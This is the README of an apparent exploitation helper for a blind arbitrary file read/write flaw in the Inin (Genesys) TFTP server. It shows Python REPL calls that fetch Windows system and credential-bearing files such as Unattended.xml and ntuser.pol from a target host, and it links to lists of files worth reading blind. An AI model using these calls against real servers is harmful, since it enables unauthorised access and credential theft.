Inin TFTP Server Arbitrary Directory Blind Read Write exploitation helper

This simple repo is for automating the process of exploiting a blind arbitrary file read/write that can be present in the inin (now genesys) tftp web server.

I may add a CLI to it when I have time, but for now I'd recommend using it with either a jupyer notebook or the python REPL loop.
Just import the main python file, instantiate the class, and call get_file and put_file as you please.

```
$ python3
>>> from file_downloader import FileDownloader
>>> fd=FileDownloader("example.com")
>>> fd.get_file("C:/Windows/Panther/Unattended.xml")
>>> fd.get_file("C:/ProgramData/ntuser.pol")

```

etcetera

hint: see https://github.com/jtpereyda/regpol for help decoding ntuser.pol

see also https://www.soffensive.com/posts/web-app-sec/2018-06-19-exploiting-blind-file-reads-path-traversal-vulnerabilities-on-microsoft-windows-operating-systems/
and https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt